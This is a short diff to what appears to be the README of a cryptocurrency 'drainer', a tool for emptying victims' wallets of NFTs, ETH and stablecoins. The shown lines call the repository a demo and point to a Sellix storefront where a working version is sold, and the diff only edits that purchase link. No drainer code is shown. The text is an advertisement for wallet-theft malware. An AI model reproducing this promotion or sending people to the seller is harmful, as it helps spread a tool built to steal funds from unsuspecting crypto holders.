@@ -1,5 +1,5 @@
 # ⛔ THIS DRAINER IS ONLY A DEMO, TO GET A WORKING ONE 
-- Buy Now : https://samireth.mysellix.io/product/6451d094a4d6c
+- Buy Now : https://samireth.mysellix.io/
 
 # 🆓  DRAINER (NFT, ETH, ERC-20 USDT USDC ETC... ⬆️⬆️⬆️
 
